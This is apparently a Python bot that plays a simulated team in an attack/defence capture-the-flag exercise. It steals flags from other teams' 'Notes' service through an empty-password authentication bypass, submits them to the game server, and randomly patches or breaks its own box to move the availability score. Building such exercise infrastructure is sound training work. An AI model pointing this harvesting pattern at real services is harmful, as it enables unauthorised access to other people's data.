#!/usr/bin/env python3
"""A simulated team.

It plays both halves of an A/D game: it attacks the other teams through the
weakness of the Notes service, submits whatever it steals, and now and then it
defends itself - patching the box, or breaking it and bringing it back, so the
SLA visibly moves on the scoreboard.

Everything it does goes through the real interfaces: the flag IDs endpoint, the
submission endpoint and the vulnerable service itself. Nothing is faked.
"""

from __future__ import annotations

import json
import os
import random
import time
import urllib.error
import urllib.request

TEAM_ID = int(os.environ.get("TEAM_ID", "0"))
TEAM_TOKEN = os.environ.get("TEAM_TOKEN", "")
GAMESERVER = os.environ.get("GAMESERVER", "http://10.10.0.1")
BOX_CONTROL = os.environ.get("BOX_CONTROL", "")
SERVICE = os.environ.get("SERVICE_NAME", "Notes")
SERVICE_PORT = int(os.environ.get("SERVICE_PORT", "8000"))

# How eager this team is, so the scoreboard does not look synthetic.
SKILL = float(os.environ.get("BOT_SKILL", "0.7"))
DEFENSE = float(os.environ.get("BOT_DEFENSE", "0.5"))
CHAOS = float(os.environ.get("BOT_CHAOS", "0.15"))
TICK = int(os.environ.get("BOT_TICK", "20"))


def log(message: str) -> None:
    print(f"[bot {TEAM_ID}] {message}", flush=True)


def http(url: str, data: dict | None = None, timeout: int = 8, headers: dict | None = None):
    request = urllib.request.Request(
        url,
        data=json.dumps(data).encode() if data is not None else None,
        headers={"Content-Type": "application/json", **(headers or {})},
        method="POST" if data is not None else "GET",
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        body = response.read()
    return json.loads(body) if body else None


def submit(flags: list[str]) -> dict:
    """Sends stolen flags through the real submission endpoint."""
    request = urllib.request.Request(
        f"{GAMESERVER}:8080/flags",
        data=json.dumps(flags).encode(),
        headers={"Content-Type": "application/json", "X-Team-Token": TEAM_TOKEN},
        method="PUT",
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        results = json.loads(response.read() or b"[]")
    accepted = sum(1 for r in results if r.get("status") == "ACCEPTED")
    return {"accepted": accepted, "total": len(results)}


def flag_ids() -> dict:
    try:
        return http(f"{GAMESERVER}:8081/flagIds?service={SERVICE}") or {}
    except (urllib.error.URLError, OSError, json.JSONDecodeError) as exc:
        log(f"cannot read the flag ids: {exc}")
        return {}


def exploit(victim: int, hints: dict) -> list[str]:
    """The whole attack: the flag id names the user, and an unpatched box lets
    an empty password through."""
    stolen = []
    host = f"http://10.60.{victim}.1:{SERVICE_PORT}"
    for _round, hint in sorted(hints.items(), key=lambda kv: -int(kv[0])):
        if not isinstance(hint, dict):
            continue
        user, note_id = hint.get("user"), hint.get("note_id")
        if not user or not note_id:
            continue
        try:
            note = http(f"{host}/notes/{note_id}?user={user}&password=")
        except (urllib.error.URLError, OSError, json.JSONDecodeError):
            continue
        content = (note or {}).get("content", "")
        if content:
            stolen.append(content.strip())
    return stolen


def control(**state) -> None:
    if not BOX_CONTROL:
        return
    try:
        http(BOX_CONTROL, data=state, timeout=5)
    except (urllib.error.URLError, OSError, json.JSONDecodeError) as exc:
        log(f"cannot reach my own box: {exc}")


def attack_round() -> None:
    data = flag_ids().get(SERVICE, {})
    victims = [int(team) for team in data if int(team) != TEAM_ID]
    if not victims:
        return
    random.shuffle(victims)
    # A team that is not very good does not get round to everybody.
    victims = victims[: max(1, int(len(victims) * SKILL))]

    harvest: list[str] = []
    for victim in victims:
        harvest.extend(exploit(victim, data.get(str(victim), {})))
    if not harvest:
        return
    try:
        result = submit(harvest)
        log(f"submitted {result['total']} flags, {result['accepted']} accepted")
    except urllib.error.HTTPError as exc:
        log(f"submission refused ({exc.code}): probably banned or the game is over")
    except (urllib.error.URLError, OSError) as exc:
        log(f"cannot submit: {exc}")


def defense_round() -> None:
    """Patching, and the occasional self inflicted outage."""
    roll = random.random()
    if roll < CHAOS:
        log("breaking my own service (bad deploy)")
        control(broken=True)
        time.sleep(random.randint(TICK, TICK * 3))
        log("service restored")
        control(broken=False)
    elif roll < CHAOS + DEFENSE * 0.3:
        log("patching the authentication bug")
        control(patched=True)
    elif roll > 0.95:
        log("rolling the patch back (it broke something)")
        control(patched=False)


def main() -> None:
    log(f"joined the game, skill={SKILL} defense={DEFENSE} chaos={CHAOS}")
    # Teams do not all wake up at the same second.
    time.sleep(random.randint(0, TICK))
    while True:
        try:
            attack_round()
            if random.random() < DEFENSE:
                defense_round()
        except Exception as exc:  # a bot must never take the simulation down
            log(f"unexpected error: {exc}")
        time.sleep(TICK + random.randint(-3, 3))


if __name__ == "__main__":
    main()
